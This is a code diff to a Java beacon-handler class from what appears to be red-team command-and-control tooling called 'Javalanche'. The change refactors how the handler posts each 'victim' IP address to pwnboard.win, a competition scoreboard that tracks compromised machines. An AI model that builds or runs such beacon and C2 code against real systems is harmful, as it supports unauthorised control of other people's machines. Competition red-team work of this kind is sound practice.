@@ -6,7 +6,8 @@ import Servers.keepAlive;
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.HttpURLConnection;
-import java.net.URL;
+import java.net.URI;
+import java.net.URISyntaxException;
 
 public class BeaconClientHandler implements Runnable{
     // IP address of the client
@@ -32,8 +33,9 @@ public class BeaconClientHandler implements Runnable{
     private Object sendLock;
 
     // Variables to send data to Pwnboard
-    HttpURLConnection connection;
-    URL url;
+    private HttpURLConnection connection;
+    private URI uri;
+    private String pwnBoardData;
 
     /**
      * Use this Class to create a new thread to handle each victim connection
@@ -51,6 +53,13 @@ public class BeaconClientHandler implements Runnable{
         this.sendLock = new Object();
         this.keepAliveClass = new keepAlive(this.duplexer, sendLock, true, true);
         this.keepAliveThread = new Thread(keepAliveClass);
+        this.connection = null;
+        try{
+            this.uri = new URI("https://pwnboard.win/pwn/boxaccess");
+        } catch (URISyntaxException e){
+            e.printStackTrace();
+        }
+        this.pwnBoardData = "{'ip': " + IPAddress + ", 'type': 'Javalanche'}";
     }
 
     protected void quit(String reason) throws IOException{
@@ -83,25 +92,24 @@ public class BeaconClientHandler implements Runnable{
     }
 
     /**
-     * This method sends a HTTP request to pwnbaord. pwnboard keeps track of what machines we have access to in the competition
+     * This method sends a HTTP request to pwnbaord. pwnboard keeps track of what machines we have access to in the competition, so this method is called
+     * Whenever a message is received from the client
      */
     private void sendPwnBoardRequest(){
         try{
-            url = new URL("https://pwnboard.win/pwn/boxaccess");
-            String pwnBoardData = "{'ip': " + IPAddress + ", 'type': 'Javalanche'}";
-            connection = (HttpURLConnection) url.openConnection();
+            // Open a connection to PWNBoard and set some basic variables
+            connection = (HttpURLConnection) uri.toURL().openConnection();
             connection.setRequestMethod("POST");
             connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
             connection.setRequestProperty("Content-Length", Integer.toString(pwnBoardData.length()));
             connection.setRequestProperty("Content-Language", "en-US");  
-
             connection.setUseCaches(false);
             connection.setDoOutput(true);
 
-            //Send request
-            DataOutputStream wr = new DataOutputStream (connection.getOutputStream());
-            wr.writeBytes(pwnBoardData);
-            wr.close();
+            // Send Post request
+            DataOutputStream writer = new DataOutputStream (connection.getOutputStream());
+            writer.writeBytes(pwnBoardData);
+            writer.close();
         } catch (Exception e){
             e.printStackTrace();
         }
